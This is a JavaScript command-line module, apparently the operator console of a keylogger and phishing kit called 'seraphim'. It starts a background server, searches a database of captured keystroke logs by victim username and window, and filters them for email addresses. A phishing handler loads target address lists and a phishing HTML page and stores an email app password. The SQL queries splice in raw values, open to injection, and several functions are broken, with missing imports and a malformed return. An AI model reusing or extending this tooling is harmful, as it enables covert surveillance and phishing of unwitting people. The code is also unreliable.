import pc from "picocolors";
import * as fs from "node:fs";
import {spawn} from "node:child_process";
import {intro, multiselect, outro, select} from "@clack/prompts";
import Database from "better-sqlite3";

export function serverUpHandler(options) {
    if (fs.existsSync("server.data") && options.force === undefined) {
        console.error(`\n${pc.bgRed(" ERROR ")} server already running (--force to force creation)`);
        return;
    }

    const child = spawn('node', ['server.js', options.port], {
        detached: true,
        stdio: 'ignore'
    });

    fs.writeFileSync("server.data", JSON.stringify({server: child.pid}));
    child.unref();

    console.log(`\n${pc.bgGreen(" SUCCESS ")} server started on port ${options.port}`);
}
export function serverDownHandler() {
    try {
        const file = fs.readFileSync("server.data").toString();
        const fileObject = JSON.parse(file);

        process.kill(fileObject.server);
        fs.unlinkSync("server.data");

        console.log(`\n${pc.bgGreen(" SUCCESS ")} server stopped`);
    } catch (error) {
        console.error(`\n${pc.bgRed(" ERROR ")} server is not running`);
    }
}
export function showStatusHandler() {
    console.log(fs.existsSync("server.data") ?
        `\n${pc.green("   ")}server is running with PID ${JSON.parse(fs.readFileSync("server.data").toString()).server}` :
        `\n${pc.red("  ")}server isn't running!`
    );
    console.log(`${pc.blue("  ")}no email updates.`)
}
export async function handleKeyloggerDatabaseSearch(options) {
    try {
        intro(`${pc.bgWhite(' search on database ')}`);

        const db = new Database("seraphim.db");

        const user = await getUserFromDB(db);
        const patterns = await getPatternsFromUser();
        const windows = await getWindowsFromUserFromDB(user, patterns, db);

        const result = await getSearchResult(user, patterns, windows, db);

        outro("starting searching...");

        if (result.length === 0) {
            throw new Error();
        } else {
            console.table(result);
        }
    } catch (error) {
        console.error(`\n\n${pc.bgRed(' ERORR ')} Empty Database`);
    }
}

async function getUserFromDB(db) {
    const userOptionsQuery = db.prepare(`SELECT DISTINCT username
                                             FROM logs`);
    const userOptions = userOptionsQuery.all();

    let newArr = [];

    for (let i = 0; i < userOptions.length; i++) {
        newArr.push({value: i.toString(), label: userOptions[i].username})
    }

    const userIndex = await select({
        message: 'Pick an user.',
        options: newArr,
    });

    return userOptions[userIndex];
}
async function getPatternsFromUser() {
    return await multiselect({
        message: 'Pick some patterns',
        options: [
            {value: "*@*.[a-zA-Z][a-zA-Z]*", label: "Email"},
            {value: "all", label: "All"}
        ]
    });
}

async function getWindowsFromUserFromDB(user, patterns, db) {
    try {
        let windowOptions = []

        if (patterns.find((el) => el === "all")) {
            const windowOptionsQuery = db.prepare(`SELECT DISTINCT window
                                                   FROM logs
                                                   WHERE username = '${user.username}'`);
            for (const window of windowOptionsQuery.all()) {
                windowOptions.push(window);
            }
        } else {

            for (const pattern of patterns) {
                const windowOptionsQuery = db.prepare(`SELECT DISTINCT window
                                                       FROM logs
                                                       WHERE username = '${user.username}'
                                                         AND payload_content GLOB '${pattern}'`);
                for (const window of windowOptionsQuery.all()) {
                    windowOptions.push(window);
                }
            }
        }


        if (windowOptions.length === 0) {
            throw new Error("No windows matched this pattern");
        }

        let newArr = [];

        for (let i = 0; i < windowOptions.length; i++) {
            newArr.push({value: windowOptions[i].window, label: windowOptions[i].window})
        }

        return await multiselect({
            message: 'Pick some windows.',
            options: newArr,
        });
    } catch (e) {
        console.error(`\n\n${pc.bgRed(" ERROR ")}\ ${e}`);
    }
}
async function getSearchResult(user, patterns, windows, db) {
    try {
        let queryResult = []

        if (patterns.find((el) => el === "all")) {
            for (const window of windows) {
                const query = db.prepare(`SELECT *
                                          FROM logs
                                          WHERE window = '${window}'
                                            AND username = '${user.username}'`);
                for (const queryPart of query.all()) {
                    queryResult.push(queryPart);
                }
            }
        } else {

            for (const pattern of patterns) {
                for (const window of windows) {
                    const query = db.prepare(`SELECT *
                                              FROM logs
                                              WHERE window = '${window}'
                                                AND username = '${user.username}'
                                                AND payload_content GLOB '${pattern}'`);
                    for (const queryPart of query.all()) {
                        queryResult.push(queryPart);
                    }
                }
            }
        }

        return queryResult;
    } catch (e) {
        console.error(`\n\n${pc.bgRed(" ERROR ")}\ ${e}`);
    }
};

async function login(email, pass){

    const config = {
    email: email,
    appPassword: pass
    };

    const json = JSON.stringify(config);
    await writeFile(".login.json", json, "utf-8");
}

export async function sendEmailHandler(options){

    try{
        await access(options.archive);
        const content_email = await fs.readFile(options.archive, "utf-8");

        const emails = content_email
            .split("\n")
            .map(email => email.trim())
            .filter(email => email.length > 0);

        await access(options.phishing);
        const html = await fs.readFile(options.phishing);

        login(options.email, options.token);

        return content_email, html;

    } catch (e) {
        console.error(`\n\n${pc.bgRed(" ERROR ")}\ ${e}`);
    }
};

